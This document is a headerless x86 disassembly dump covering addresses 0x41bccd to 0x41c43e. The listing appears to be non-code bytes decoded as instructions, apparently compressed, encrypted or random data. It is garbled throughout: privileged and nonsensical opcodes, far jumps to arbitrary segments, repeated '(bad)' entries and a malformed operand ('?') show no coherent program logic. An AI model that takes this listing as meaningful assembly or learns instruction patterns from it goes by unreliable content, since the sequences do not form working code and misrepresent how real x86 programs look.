  41bccd:	xlat   BYTE PTR ds:[ebx]
  41bcce:	hlt    
  41bccf:	mov    bh,0xbf
  41bcd1:	fs ins DWORD PTR es:[edi],dx
  41bcd3:	test   DWORD PTR [ebp+0x43],ecx
  41bcd6:	jmp    0x41bcce
  41bcd8:	cmp    al,0xb4
  41bcda:	int    0xf9
  41bcdc:	mov    BYTE PTR [edx+eax*4],cl
  41bcdf:	and    BYTE PTR [edi-0x407adbc9],0xc1
  41bce6:	cmp    edx,0x6136e49b
  41bcec:	iret   
  41bced:	ret    
  41bcee:	out    0x91,al
  41bcf0:	shl    DWORD PTR [edi+0x23],1
  41bcf3:	shr    BYTE PTR [ebx],0x28
  41bcf6:	adc    eax,0xbcd8318e
  41bcfb:	(bad)  
  41bcfc:	scas   al,BYTE PTR es:[edi]
  41bcfd:	or     al,0x57
  41bcff:	push   DWORD PTR [ebx]
  41bd01:	aas    
  41bd02:	mov    cl,0xd9
  41bd04:	inc    edi
  41bd05:	aam    0xc6
  41bd07:	adc    DWORD PTR [ecx],esp
  41bd09:	xchg   DWORD PTR [edx-0x769ccb89],esp
  41bd0f:	sahf   
  41bd10:	sti    
  41bd11:	sub    BYTE PTR [edi],al
  41bd13:	int3   
  41bd14:	rcl    bl,1
  41bd16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd17:	cwde   
  41bd18:	jmp    0x2fd5:0x8151b473
  41bd1f:	jo     0x41bd21
  41bd21:	pushf  
  41bd22:	imul   edi,DWORD PTR [edx+ebp*2+0x220f5783],0xffffff8e
  41bd2a:	inc    edi
  41bd2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd2c:	jg     0x41bd67
  41bd2e:	pop    ebx
  41bd2f:	aam    0xb7
  41bd31:	pop    ebx
  41bd32:	adc    DWORD PTR [edx+0x440f9e4],ecx
  41bd38:	mov    al,ds:0xdd5bd782
  41bd3d:	hlt    
  41bd3e:	je     0x41bd8f
  41bd40:	and    ecx,DWORD PTR [ebx-0x5e]
  41bd43:	pop    ecx
  41bd44:	out    dx,eax
  41bd45:	xchg   ebp,eax
  41bd46:	sub    DWORD PTR [edi-0x2bda1b13],esi
  41bd4c:	push   cs
  41bd4d:	inc    edi
  41bd4e:	sbb    eax,ebp
  41bd50:	fistp  DWORD PTR [edx-0x5e]
  41bd53:	pop    eax
  41bd54:	jecxz  0x41bd18
  41bd56:	nop
  41bd57:	stc    
  41bd58:	jle    0x41bda4
  41bd5a:	enter  0x5028,0xc5
  41bd5e:	into   
  41bd5f:	mov    esi,esi
  41bd61:	shl    BYTE PTR [edi],0x2b
  41bd64:	fwait
  41bd65:	leave  
  41bd66:	stos   DWORD PTR es:[edi],eax
  41bd67:	repnz inc edx
  41bd69:	fwait
  41bd6a:	sub    eax,0x2e2b38ca
  41bd6f:	fld    st(5)
  41bd71:	cmp    al,0x8c
  41bd73:	stos   BYTE PTR es:[edi],al
  41bd74:	jmp    0x96e5:0x598405db
  41bd7b:	enter  0xa096,0x9e
  41bd7f:	mov    eax,ds:0xba463510
  41bd84:	arpl   sp,si
  41bd86:	pop    ebx
  41bd87:	adc    al,0x2a
  41bd89:	into   
  41bd8a:	out    dx,eax
  41bd8b:	add    DWORD PTR [ebp+0x6],0x55
  41bd8f:	aam    0x24
  41bd91:	fs cwde 
  41bd93:	mov    edx,0xb58b3242
  41bd98:	test   al,0x56
  41bd9a:	push   cs
  41bd9b:	jns    0x41bd8a
  41bd9d:	add    DWORD PTR [edi],0x50c5600a
  41bda3:	push   ss
  41bda4:	or     BYTE PTR [esi+ecx*2+0x1fa62ae8],dl
  41bdab:	aas    
  41bdac:	out    0x73,eax
  41bdae:	int3   
  41bdaf:	adc    eax,0xbd94f8f4
  41bdb4:	mov    ah,0x40
  41bdb6:	test   DWORD PTR [ebp*2+0x475bc347],0xdca9bc75
  41bdc1:	scas   eax,DWORD PTR es:[edi]
  41bdc2:	aas    
  41bdc3:	outs   dx,BYTE PTR ds:[esi]
  41bdc4:	ss mov ah,0xac
  41bdc7:	ins    DWORD PTR es:[edi],dx
  41bdc8:	push   esp
  41bdc9:	mov    ecx,0x2b593ead
  41bdce:	loop   0x41bd6b
  41bdd0:	xchg   edx,eax
  41bdd1:	push   edi
  41bdd2:	dec    ebp
  41bdd3:	(bad)  
  41bdd4:	and    esp,DWORD PTR [ebx+ebx*4-0x48ef83f1]
  41bddb:	mov    ebx,0x616ffb02
  41bde0:	or     eax,0x8be5d4e
  41bde5:	(bad)  ds:0xd1e16248
  41bdeb:	jns    0x41be45
  41bded:	les    esp,FWORD PTR ds:[esp+ecx*1]
  41bdf1:	xchg   dh,al
  41bdf3:	ins    DWORD PTR es:[edi],dx
  41bdf4:	cmp    dh,0xc5
  41bdf7:	push   edx
  41bdf8:	jo     0x41be2a
  41bdfa:	retf   
  41bdfb:	mov    ds:0x26bf2084,al
  41be00:	out    dx,eax
  41be01:	hlt    
  41be02:	mov    ds:0xddf36cfb,eax
  41be07:	retf   0xeafd
  41be0a:	mov    ds:0x7e45e232,eax
  41be0f:	daa    
  41be10:	push   ebx
  41be11:	push   eax
  41be12:	add    eax,0xa59f57c9
  41be17:	inc    ebx
  41be18:	ret    
  41be19:	and    edi,DWORD PTR [ebx-0x4371b000]
  41be1f:	retf   0x119d
  41be22:	push   edx
  41be23:	xor    DWORD PTR [ebx+edi*8+0x18],edi
  41be27:	pop    esp
  41be28:	inc    ebp
  41be29:	cmp    al,0xb7
  41be2b:	scas   al,BYTE PTR es:[edi]
  41be2c:	xchg   esi,eax
  41be2d:	mov    esi,0x8c661c77
  41be32:	inc    edx
  41be33:	push   edi
  41be34:	mov    DWORD PTR [esp+eax*1+0x41],esp
  41be38:	cdq    
  41be39:	cmp    al,BYTE PTR [ebx+edi*1+0x5b7c3719]
  41be40:	aam    0x78
  41be42:	das    
  41be43:	jno    0x41be05
  41be45:	mov    fs,ebx
  41be47:	inc    esi
  41be48:	dec    ebp
  41be49:	push   es
  41be4a:	xchg   ebx,eax
  41be4b:	push   0xbaa6da19
  41be50:	int3   
  41be51:	std    
  41be52:	push   cs
  41be53:	jmp    0x41be37
  41be55:	(bad)  
  41be56:	lods   al,BYTE PTR ds:[esi]
  41be57:	cld    
  41be58:	adc    DWORD PTR [edi-0x6c08baec],ecx
  41be5e:	and    bl,BYTE PTR [edx-0x2bb93091]
  41be64:	and    DWORD PTR [ecx-0x564f3764],esp
  41be6a:	jb     0x41be4a
  41be6c:	mov    cs,WORD PTR [ebx+0x24]
  41be6f:	js     0x41be5d
  41be71:	cwde   
  41be72:	dec    ecx
  41be73:	mov    ah,0x59
  41be75:	into   
  41be76:	and    edi,DWORD PTR [edx]
  41be78:	ja     0x41bee8
  41be7a:	pushf  
  41be7b:	das    
  41be7c:	out    dx,al
  41be7d:	and    WORD PTR [eax+esi*1],bx
  41be81:	fcmovnbe st,st(7)
  41be83:	int    0xf4
  41be85:	dec    esp
  41be86:	inc    esi
  41be87:	mov    ebx,0xa810a540
  41be8c:	push   ebp
  41be8d:	mov    ebx,0x53bd5d22
  41be92:	xor    eax,0xf7d8b436
  41be97:	or     DWORD PTR [edi],ebx
  41be99:	in     eax,dx
  41be9a:	sahf   
  41be9b:	sbb    DWORD PTR [eax+0x7f],edx
  41be9e:	cs mov al,0xa5
  41bea1:	mov    esp,0x882466f6
  41bea6:	jbe    0x41bee7
  41bea8:	(bad)  
  41bea9:	fcom   QWORD PTR ss:[eax+eiz*1-0x2]
  41beae:	and    DWORD PTR [ecx-0x56f72bc2],0x72
  41beb5:	scas   eax,DWORD PTR es:[edi]
  41beb6:	dec    ecx
  41beb7:	scas   eax,DWORD PTR es:[edi]
  41beb8:	pop    ecx
  41beb9:	aam    0x3c
  41bebb:	add    eax,0xb580a76a
  41bec0:	(bad)  
  41bec2:	ficomp DWORD PTR [edx-0x49dbd55f]
  41bec8:	iret   
  41bec9:	inc    edx
  41beca:	jns    0x41bebb
  41becc:	push   ebx
  41becd:	repz inc edx
  41becf:	imul   eax,DWORD PTR [esp+eax*8+0x76f02787],0xae1268f4
  41beda:	add    DWORD PTR [esi+0x6f763a89],edx
  41bee0:	nop
  41bee1:	daa    
  41bee2:	retw   
  41bee4:	shl    cl,0xa9
  41bee7:	add    eax,0xab71cb19
  41beec:	pop    ds
  41beed:	pop    ebp
  41beee:	stos   BYTE PTR es:[edi],al
  41beef:	daa    
  41bef0:	push   edi
  41bef1:	pop    es
  41bef2:	ins    BYTE PTR es:[edi],dx
  41bef3:	test   al,0xbf
  41bef5:	add    cl,BYTE PTR [ecx+ebx*4+0x7006a526]
  41befc:	xchg   edx,eax
  41befd:	add    ah,dh
  41beff:	mov    ebx,0xdbb7f5bf
  41bf04:	in     eax,0x5e
  41bf06:	jmp    0x41bf37
  41bf08:	cmp    BYTE PTR [edx-0x64],cl
  41bf0b:	xor    edx,DWORD PTR [esi+0x68]
  41bf0e:	add    ah,dl
  41bf10:	cld    
  41bf11:	and    al,0xdd
  41bf13:	pusha  
  41bf14:	stos   DWORD PTR es:[edi],eax
  41bf15:	pop    ebp
  41bf16:	repz push 0x1c93c736
  41bf1c:	fldcw  WORD PTR [edi+0x38]
  41bf1f:	and    eax,0xcf73cad9
  41bf24:	add    DWORD PTR [ebx],edi
  41bf26:	iret   
  41bf27:	iret   
  41bf28:	mov    BYTE PTR [edx+0x53],dl
  41bf2b:	cld    
  41bf2c:	(bad)  
  41bf2d:	xchg   esp,eax
  41bf2e:	ret    
  41bf2f:	test   al,0x30
  41bf32:	add    ch,BYTE PTR [ebp-0x41]
  41bf35:	or     al,0xa2
  41bf37:	mov    ebx,0x50e356bf
  41bf3c:	cli    
  41bf3d:	out    0xd5,al
  41bf3f:	fild   DWORD PTR [eax]
  41bf41:	and    ch,0x25
  41bf44:	mov    ebx,0x493fe8dc
  41bf49:	(bad)  
  41bf4a:	jmp    0x41bfa7
  41bf4c:	mov    dh,0x26
  41bf4e:	or     esp,DWORD PTR [esi+0x5ddc7b8]
  41bf54:	ins    BYTE PTR es:[edi],dx
  41bf55:	das    
  41bf56:	bound  ebp,QWORD PTR [edx+edx*2-0x74]
  41bf5a:	outs   dx,DWORD PTR ds:[esi]
  41bf5b:	add    eax,0x141aa8e1
  41bf60:	je     0x41bfde
  41bf62:	sub    edx,esp
  41bf64:	and    DWORD PTR [ebx+0x61],ebx
  41bf67:	ret    0x5497
  41bf6a:	aaa    
  41bf6b:	fstp   TBYTE PTR [edx+0x3bca13ad]
  41bf71:	cmp    ebx,DWORD PTR [eax-0x14924ac8]
  41bf77:	push   esi
  41bf78:	add    BYTE PTR [edx],dl
  41bf7a:	push   esi
  41bf7b:	leave  
  41bf7c:	fs mov cl,0x3c
  41bf7f:	sub    DWORD PTR [edx],0xffffffef
  41bf82:	stc    
  41bf83:	push   ds
  41bf84:	mov    bh,0x93
  41bf86:	fs and al,0x55
  41bf89:	push   esp
  41bf8a:	imul   eax,DWORD PTR [esi],0x65a8609d
  41bf90:	idiv   DWORD PTR [ebx+0x30]
  41bf93:	mov    dh,0xda
  41bf95:	ins    BYTE PTR es:[edi],dx
  41bf96:	aaa    
  41bf97:	loope  0x41c015
  41bf99:	sbb    al,0x1d
  41bf9b:	jnp    0x41bfa1
  41bf9d:	xor    eax,0xfd9002ee
  41bfa2:	rol    dl,1
  41bfa4:	cmp    edx,DWORD PTR [esi]
  41bfa6:	lods   eax,DWORD PTR ds:[esi]
  41bfa7:	jge    0x41bf83
  41bfa9:	or     ch,0xf4
  41bfac:	mov    al,0x9f
  41bfae:	icebp  
  41bfaf:	lahf   
  41bfb0:	cs aas 
  41bfb2:	leave  
  41bfb3:	mov    eax,ds:0xceab8e75
  41bfb8:	xchg   esp,eax
  41bfb9:	cld    
  41bfba:	lds    edx,FWORD PTR [edi]
  41bfbc:	add    edx,esp
  41bfbe:	jg     0x41bf4e
  41bfc0:	repnz cdq 
  41bfc2:	cmp    DWORD PTR [eax],0xffffffe3
  41bfc5:	jle    0x41c03d
  41bfc7:	ss scas al,BYTE PTR es:[edi]
  41bfc9:	mov    ebx,0xc0aedcb7
  41bfce:	iret   
  41bfcf:	push   esp
  41bfd0:	loop   0x41c02d
  41bfd2:	sub    esp,esi
  41bfd4:	pop    ds
  41bfd5:	or     edi,DWORD PTR [ebp-0x69]
  41bfd8:	push   esp
  41bfd9:	pop    edi
  41bfda:	pop    eax
  41bfdb:	aaa    
  41bfdc:	scas   eax,DWORD PTR es:[edi]
  41bfdd:	es xchg ebx,eax
  41bfdf:	ss cli 
  41bfe1:	sub    al,BYTE PTR [eax]
  41bfe3:	imul   ebx,DWORD PTR [ecx-0x315f7e0c],0x3939df4e
  41bfed:	ds arpl dx,cx
  41bff0:	sub    eax,0xa767f9bd
  41bff5:	ret    0x24f7
  41bff8:	jmp    0xb161:0xa74f19f0
  41bfff:	lods   eax,DWORD PTR ds:[esi]
  41c000:	or     BYTE PTR [ecx],0x90
  41c003:	and    eax,0xb601f025
  41c008:	ss push eax
  41c00a:	inc    ebp
  41c00b:	rol    DWORD PTR [edi],cl
  41c00d:	push   eax
  41c00e:	mov    eax,0x818a9efb
  41c013:	int    0xb6
  41c015:	dec    eax
  41c016:	dec    edx
  41c017:	push   edx
  41c018:	pusha  
  41c019:	or     edi,edx
  41c01b:	jle    0x41c01f
  41c01d:	jp     0x41bfc6
  41c01f:	sub    DWORD PTR [edx+0x6e5a33bb],0xa9bedaf3
  41c029:	fsubr  DWORD PTR [ebx-0x5b]
  41c02c:	(bad)  
  41c02d:	cwde   
  41c02e:	out    dx,al
  41c02f:	stc    
  41c030:	xor    esi,edi
  41c032:	cli    
  41c033:	addr16 je 0x41bfd0
  41c036:	add    BYTE PTR [esi+ecx*8],0xf
  41c03a:	jg     0x41c013
  41c03c:	mov    cl,0xdd
  41c03e:	imul   edi,DWORD PTR [ecx+0x39b7288f],0x9c4284b4
  41c048:	daa    
  41c049:	jl     0x41c010
  41c04b:	mov    edi,0xbc3494a7
  41c050:	out    0x80,eax
  41c052:	je     0x41c0d3
  41c054:	enter  0x61dd,0x4c
  41c058:	xor    al,0x75
  41c05a:	jo     0x41c0d6
  41c05c:	push   esp
  41c05d:	push   ax
  41c05f:	jae    0x41c01e
  41c061:	icebp  
  41c062:	stos   DWORD PTR es:[edi],eax
  41c063:	out    dx,eax
  41c064:	xchg   DWORD PTR [edx-0x500909db],esp
  41c06a:	lahf   
  41c06b:	jg     0x41c0e3
  41c06d:	arpl   sp,bp
  41c06f:	sub    edx,esi
  41c071:	scas   al,BYTE PTR es:[edi]
  41c072:	jno    0x41c052
  41c074:	cdq    
  41c075:	or     al,0x7b
  41c077:	(bad)  
  41c078:	outs   dx,BYTE PTR ds:[esi]
  41c079:	hlt    
  41c07a:	mov    al,0x7b
  41c07c:	aas    
  41c07d:	fst    DWORD PTR [ebp+0x3f]
  41c080:	inc    ecx
  41c081:	adc    bh,ch
  41c083:	mov    ch,ch
  41c085:	jecxz  0x41c0bc
  41c087:	aad    0x12
  41c089:	js     0x41c0c2
  41c08b:	mov    eax,DWORD PTR [edi-0x1f]
  41c08e:	or     bh,al
  41c090:	lea    edi,[edi+0x21]
  41c093:	pop    esi
  41c094:	push   0xffffffdb
  41c096:	lahf   
  41c097:	fdivr  QWORD PTR [ecx-0x4dc5dc6c]
  41c09d:	shl    DWORD PTR [esi+0x47a48d33],cl
  41c0a3:	inc    esi
  41c0a4:	pop    es
  41c0a5:	jmp    FWORD PTR [eax]
  41c0a7:	push   edx
  41c0a8:	fiadd  WORD PTR [eax+0x32c6b6c6]
  41c0ae:	jp     0x41c0ad
  41c0b0:	add    ebp,ebx
  41c0b2:	mov    esp,0x44846ca3
  41c0b7:	cwde   
  41c0b8:	or     BYTE PTR [edi],ch
  41c0ba:	icebp  
  41c0bb:	test   esi,0xa7133e53
  41c0c1:	dec    ebx
  41c0c2:	(bad)
  41c0c7:	jns    0x41c0d4
  41c0c9:	stos   BYTE PTR es:[edi],al
  41c0ca:	adc    DWORD PTR [esi-0xa9bdd4a],0xffffff91
  41c0d1:	loop   0x41c05a
  41c0d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0d4:	in     al,dx
  41c0d5:	dec    esi
  41c0d6:	or     DWORD PTR [ecx],0xffffff9b
  41c0d9:	ja     0x41c0b6
  41c0db:	and    ebx,edi
  41c0dd:	mov    eax,0xdf4028c3
  41c0e2:	pusha  
  41c0e3:	mov    cl,0xf8
  41c0e5:	sbb    esp,DWORD PTR [ebx]
  41c0e7:	out    0x57,eax
  41c0e9:	xchg   ebx,eax
  41c0ea:	std    
  41c0eb:	leave  
  41c0ec:	nop
  41c0ed:	xchg   ebx,eax
  41c0ee:	push   edi
  41c0ef:	jns    0x41c0c6
  41c0f1:	sbb    eax,0xfcf7f2ae
  41c0f6:	ins    BYTE PTR es:[edi],dx
  41c0f7:	(bad)  
  41c0f8:	mov    bh,0xed
  41c0fa:	adc    al,0xa4
  41c0fc:	outs   dx,DWORD PTR ds:[esi]
  41c0fd:	sar    DWORD PTR [edx],1
  41c0ff:	popf   
  41c100:	cld    
  41c101:	cdq    
  41c102:	and    al,BYTE PTR [eax]
  41c104:	stos   DWORD PTR es:[edi],eax
  41c105:	lock cmp eax,0xd7b1289d
  41c10b:	ds in  eax,0xda
  41c10e:	sbb    cl,BYTE PTR [ebp+0x13]
  41c111:	dec    esp
  41c112:	sbb    BYTE PTR [edi+0x7cf5e508],dl
  41c118:	inc    BYTE PTR [ecx-0x41]
  41c11b:	jp     0x41c18e
  41c11d:	adc    DWORD PTR [eax],ebx
  41c11f:	fld    QWORD PTR [esi+0x55f4a476]
  41c125:	jmp    0x9142d22c
  41c12a:	mov    ah,0x57
  41c12c:	push   0x10
  41c12e:	aaa    
  41c12f:	mov    edx,0xdab51894
  41c134:	std    
  41c135:	int3   
  41c136:	sub    al,BYTE PTR [esi-0x47]
  41c139:	dec    edx
  41c13a:	or     esi,edx
  41c13c:	out    dx,al
  41c13d:	xor    eax,0x793c5a0d
  41c142:	inc    esp
  41c143:	ds pop edi
  41c145:	imul   eax,DWORD PTR [edx+eax*4],0xffffffc2
  41c149:	mov    ebp,0xeb4458e7
  41c14e:	inc    esi
  41c14f:	mov    es,WORD PTR [edx+eax*1+0x498e6f75]
  41c156:	jns    0x41c196
  41c158:	hlt    
  41c159:	lea    ecx,[esi]
  41c15b:	ror    BYTE PTR ds:0xa2e6ec6e,0x7c
  41c162:	cmp    edi,DWORD PTR [esi-0x37]
  41c165:	out    dx,al
  41c166:	jb     0x41c1bc
  41c168:	fsubr  DWORD PTR [eax+0x35b6ca3d]
  41c16e:	jbe    0x41c126
  41c170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c171:	and    DWORD PTR [esi+0x5a],0xffffffef
  41c175:	xchg   edi,eax
  41c176:	cli    
  41c177:	aad    0x0
  41c179:	or     DWORD PTR [edi+edx*8-0x4fcfc81c],ecx
  41c180:	cmc    
  41c181:	pop    ebp
  41c182:	pop    es
  41c183:	adc    cl,BYTE PTR [ebp+ebx*8+0x102513dc]
  41c18a:	pop    esp
  41c18b:	xor    BYTE PTR [ebx+0x62],ch
  41c18e:	mov    ecx,0xc2762b9f
  41c193:	fild   QWORD PTR [esi-0x4d03a0c8]
  41c199:	loopne 0x41c183
  41c19b:	ins    DWORD PTR es:[edi],dx
  41c19c:	test   BYTE PTR [eax+0x27159bc9],bl
  41c1a2:	lods   eax,DWORD PTR ds:[esi]
  41c1a3:	out    0x24,eax
  41c1a5:	stos   DWORD PTR es:[edi],eax
  41c1a6:	push   esi
  41c1a7:	outs   dx,BYTE PTR ds:[esi]
  41c1a8:	aam    0xf0
  41c1aa:	xchg   esi,eax
  41c1ab:	into   
  41c1ac:	sbb    BYTE PTR [edi-0x25],dl
  41c1af:	ins    DWORD PTR es:[edi],dx
  41c1b0:	scas   eax,DWORD PTR es:[edi]
  41c1b1:	xor    BYTE PTR [esi+0x24bc09af],bl
  41c1b7:	inc    di
  41c1b9:	inc    eax
  41c1ba:	push   ebx
  41c1bb:	mov    cl,0x44
  41c1bd:	jnp    0x41c184
  41c1bf:	push   edi
  41c1c0:	arpl   WORD PTR [ecx+0x7],bp
  41c1c3:	aam    0x70
  41c1c5:	cmp    edx,DWORD PTR [eax-0x7d]
  41c1c8:	mov    bh,bh
  41c1ca:	pop    es
  41c1cb:	cmp    DWORD PTR [edi-0x76],ebp
  41c1ce:	mov    esp,0x6ba0f24f
  41c1d3:	test   DWORD PTR [esi+0x455be12a],0x6f3503c8
  41c1dd:	loopne 0x41c1cc
  41c1df:	retf   0x20f
  41c1e2:	mov    al,ds:0x43082409
  41c1e7:	push   cs
  41c1e8:	retf   
  41c1e9:	sub    DWORD PTR [ebp+0x1ff3f8a],0xf181f387
  41c1f3:	push   0x8db27321
  41c1f8:	aas    
  41c1f9:	rcl    DWORD PTR [esi-0x23],1
  41c1fc:	cs mov cl,0x10
  41c1ff:	and    BYTE PTR [ebx+0x4ed24b42],dh
  41c205:	xor    DWORD PTR [ebp-0x436e9338],ebx
  41c20b:	das    
  41c20c:	and    ah,BYTE PTR [ebx-0x5e9d2bc2]
  41c212:	xchg   esi,eax
  41c213:	data16 sbb BYTE PTR [edx+0x11a58a94],dh
  41c21a:	lods   al,BYTE PTR ds:[esi]
  41c21b:	pop    es
  41c21c:	out    0xea,al
  41c21e:	cdq    
  41c21f:	push   es
  41c220:	xchg   esi,eax
  41c221:	loop   0x41c292
  41c223:	cwde   
  41c224:	cdq    
  41c225:	bound  eax,QWORD PTR [ebx-0x70]
  41c228:	aad    0xc3
  41c22a:	popf   
  41c22b:	ja     0x41c2aa
  41c22d:	xor    DWORD PTR [ecx+0x3e0895c9],ebp
  41c233:	rcr    BYTE PTR [edx-0x390835a2],cl
  41c239:	push   ecx
  41c23a:	inc    ebx
  41c23b:	cmp    al,al
  41c23d:	xchg   edx,eax
  41c23e:	sub    al,0x33
  41c240:	inc    ebp
  41c241:	jge    0x41c1fa
  41c243:	ins    BYTE PTR es:[edi],dx
  41c244:	lea    edi,[ebp-0x454e6c49]
  41c24a:	xchg   esi,eax
  41c24b:	out    0x11,eax
  41c24d:	out    0xbf,al
  41c24f:	adc    DWORD PTR [ebp-0xa],edi
  41c252:	fld    TBYTE PTR [ecx+0x4c6c233b]
  41c258:	adc    BYTE PTR [edi+0x27d6f2e8],al
  41c25e:	in     al,dx
  41c25f:	sbb    esp,eax
  41c261:	mov    esi,0xde625ed6
  41c266:	sbb    al,0x6
  41c268:	pop    esi
  41c269:	pusha  
  41c26a:	test   BYTE PTR [esi+0x3d],dl
  41c26d:	lock xchg bh,ch
  41c270:	cs push esi
  41c272:	sbb    al,BYTE PTR [eax+0x49676358]
  41c278:	test   DWORD PTR [ebx-0x35],edx
  41c27b:	sub    DWORD PTR [ebx],ecx
  41c27d:	leave  
  41c27e:	cld    
  41c27f:	rcl    BYTE PTR [edx+edx*4+0x7c4218ec],cl
  41c286:	clc    
  41c287:	sub    eax,0xe4201e59
  41c28c:	stos   DWORD PTR es:[edi],eax
  41c28d:	inc    eax
  41c28e:	lock adc al,0x76
  41c291:	test   DWORD PTR [esi],0x43081403
  41c297:	enter  0x3f91,0x44
  41c29b:	sbb    eax,edx
  41c29d:	icebp  
  41c29e:	mov    edi,0x7a911dd7
  41c2a3:	mov    esi,0x22a368
  41c2a8:	lock (bad) [edx+0x62]
  41c2ac:	das    
  41c2ad:	sbb    cl,BYTE PTR [esi+0x78ab95ed]
  41c2b3:	mov    ch,cl
  41c2b5:	(bad)  
  41c2b6:	and    al,0xb2
  41c2b8:	push   ss
  41c2b9:	mov    dh,0x9c
  41c2bb:	jns    0x41c24c
  41c2bd:	mov    fs,WORD PTR [eax+0x7d6fd241]
  41c2c3:	xor    DWORD PTR [esi+0x2e],0xb249105
  41c2ca:	lock lods al,BYTE PTR ds:[esi]
  41c2cc:	xchg   ecx,eax
  41c2cd:	mov    ebp,0xf8d3462c
  41c2d2:	cld    
  41c2d3:	cmp    DWORD PTR [edx+0xa],0xb899e3b3
  41c2da:	sub    bl,BYTE PTR [esi]
  41c2dc:	inc    ecx
  41c2dd:	out    dx,eax
  41c2de:	or     eax,0x38b92ba8
  41c2e3:	or     al,0xf5
  41c2e5:	xchg   esp,eax
  41c2e6:	mov    ds:0x235748d1,eax
  41c2eb:	and    eax,0xeb43e3bf
  41c2f0:	push   ebp
  41c2f1:	xor    eax,0xac771355
  41c2f6:	lds    edi,FWORD PTR [edx]
  41c2f8:	push   esp
  41c2f9:	jmp    FWORD PTR [esi-0xc]
  41c2fc:	mov    es,esi
  41c2fe:	adc    al,BYTE PTR [eax-0x7]
  41c301:	adc    DWORD PTR [edi],0x79
  41c304:	sub    bl,bl
  41c306:	nop
  41c307:	les    eax,FWORD PTR [ecx-0x7d0e3e47]
  41c30d:	popf   
  41c30e:	test   al,0x86
  41c310:	mov    eax,ds:0x94df5103
  41c315:	inc    edx
  41c316:	cmp    DWORD PTR [edx],0x7ccdcd50
  41c31c:	inc    esi
  41c31d:	shl    eax,1
  41c31f:	xor    DWORD PTR [edx],ecx
  41c321:	mov    BYTE PTR [esi-0x48d91547],cl
  41c327:	mov    ah,0x26
  41c329:	mov    dl,BYTE PTR [esi+0x65624f95]
  41c32f:	jmp    0xcdd9:0x4a7ae769
  41c336:	icebp  
  41c337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c338:	frstor [ecx+ebp*8+0x40]
  41c33c:	mov    edx,0xaf54f82
  41c341:	(bad)  [edi+0x3f]
  41c344:	ret    0x591d
  41c347:	push   0x524029fe
  41c34c:	out    0x25,eax
  41c34e:	rcr    dh,cl
  41c350:	xor    edx,DWORD PTR [edi]
  41c352:	fdivr  st(7),st
  41c355:	out    dx,eax
  41c356:	push   es
  41c357:	loop   0x41c2e5
  41c359:	pop    ds
  41c35a:	jecxz  0x41c3ba
  41c35c:	cmc    
  41c35d:	xor    DWORD PTR [ebx+0x2e223952],0xb56cff57
  41c367:	push   esp
  41c368:	nop
  41c369:	bswap  edi
  41c36b:	mov    bh,BYTE PTR [ebx+ebp*4+0x8]
  41c36f:	xchg   esp,eax
  41c370:	scas   al,BYTE PTR es:[edi]
  41c371:	das    
  41c372:	mov    ch,0x8a
  41c374:	mov    eax,DWORD PTR [ebx+0x6f610a1e]
  41c37a:	jmp    0xe90e:0x886f6547
  41c381:	cwde   
  41c382:	hlt    
  41c383:	in     eax,dx
  41c384:	rcl    DWORD PTR [edi-0x5bbd453e],1
  41c38a:	mov    al,0x21
  41c38c:	(bad)  
  41c38d:	(bad)  
  41c38e:	int3   
  41c38f:	xor    bl,BYTE PTR [edx-0x40]
  41c392:	jmp    0x41c378
  41c394:	in     eax,0x73
  41c396:	shr    DWORD PTR [esi],1
  41c398:	pop    edi
  41c399:	fcom   QWORD PTR [eax]
  41c39b:	jg     0x41c3ae
  41c39d:	mov    eax,ds:0xa1bf1e92
  41c3a2:	push   ss
  41c3a3:	cmp    dl,bh
  41c3a5:	inc    ebp
  41c3a6:	xchg   edx,eax
  41c3a7:	lahf   
  41c3a8:	adc    al,dl
  41c3aa:	(bad)  
  41c3ab:	xchg   ebx,eax
  41c3ac:	loop   0x41c404
  41c3ae:	or     bh,ah
  41c3b0:	mov    eax,0x310feb36
  41c3b5:	(bad)  
  41c3b6:	mov    cl,0xd9
  41c3b8:	arpl   WORD PTR ds:[eax+0x2b49a72f],si
  41c3bf:	hlt    
  41c3c0:	dec    edi
  41c3c1:	dec    esp
  41c3c2:	lods   eax,DWORD PTR ds:[esi]
  41c3c3:	xor    ch,BYTE PTR [ecx]
  41c3c5:	or     BYTE PTR [edx+0x60],bh
  41c3c8:	xchg   esi,eax
  41c3c9:	xor    DWORD PTR [eax+edi*8],0xcfbecd6f
  41c3d0:	jle    0x41c43b
  41c3d2:	jp     0x41c439
  41c3d4:	fisttp DWORD PTR [ebx]
  41c3d6:	idiv   BYTE PTR [ebx]
  41c3d8:	or     bh,ah
  41c3da:	push   ds
  41c3db:	sub    BYTE PTR [edi+0x2e],dh
  41c3de:	cmp    BYTE PTR [ebp+0x7d],0xe2
  41c3e2:	pop    esi
  41c3e3:	mov    WORD PTR [edx],?
  41c3e5:	push   ecx
  41c3e6:	pushf  
  41c3e7:	rol    BYTE PTR [ecx+0x48],1
  41c3ea:	inc    ebx
  41c3eb:	ja     0x41c3ab
  41c3ed:	aad    0x4d
  41c3ef:	daa    
  41c3f0:	push   esp
  41c3f1:	xor    ah,ch
  41c3f3:	xor    eax,0xbdaf085d
  41c3f8:	stos   BYTE PTR es:[edi],al
  41c3f9:	dec    esp
  41c3fa:	sub    ebx,edx
  41c3fc:	cmp    esp,DWORD PTR [ecx-0x9]
  41c3ff:	std    
  41c400:	or     edx,esp
  41c402:	sar    BYTE PTR [edx-0x1d],1
  41c405:	dec    edi
  41c406:	inc    esp
  41c407:	and    al,0x9f
  41c409:	jmp    0x41c447
  41c40b:	leave  
  41c40c:	fcom   DWORD PTR [esi-0xa]
  41c40f:	aam    0xc5
  41c411:	add    eax,0xf287a961
  41c416:	push   ecx
  41c417:	cmp    eax,0x6f08fef
  41c41c:	lock imul ebx,esi,0x6c
  41c420:	add    eax,esp
  41c422:	loope  0x41c432
  41c424:	mov    dl,0x6c
  41c426:	mov    ebx,0xd0db17a4
  41c42b:	mov    es,WORD PTR [esi-0x16]
  41c42e:	xlat   BYTE PTR ds:[ebx]
  41c42f:	sbb    DWORD PTR [eax],eax
  41c431:	sbb    al,0xdb
  41c433:	mov    DWORD PTR [esp+ebp*1+0x51483be2],eax
  41c43a:	test   BYTE PTR [edi],dh
  41c43c:	jecxz  0x41c4a4
  41c43e:	call   0x3895:0xa9754334
